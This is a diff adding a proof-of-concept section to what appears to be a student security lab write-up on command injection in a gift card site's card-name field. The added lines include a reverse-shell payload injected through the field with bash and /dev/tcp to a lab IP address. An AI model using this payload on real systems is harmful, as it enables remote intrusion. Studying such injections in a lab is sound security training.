@@ -204,3 +204,8 @@ on the useCard.html site we see there is an alterante field for naming your card
 <img width="1136" alt="Screen Shot 2022-03-22 at 12 03 23 AM" src="https://user-images.githubusercontent.com/72175659/159405706-17c4f9f5-7a4d-4102-83d8-cd54f2d9e56c.png">
 
 We succeed in injecting a command.
+
+As a proof of concept exploit we use our malicious giftcard file and run the following command in the card name field ```; bash -c "/bin/bash -i > /dev/tcp/10.0.2.15/9090 0<&1 2>&1" ;
+This works becuase -c will execute any command in between the quotes. We were given the command in quotes in Lab1 to invoke a reverse shell.
+
+<img width="1140" alt="Screen Shot 2022-03-22 at 1 53 21 AM" src="https://user-images.githubusercontent.com/72175659/159598757-92d16922-8f54-4a11-b33b-f35ede9d772a.png">
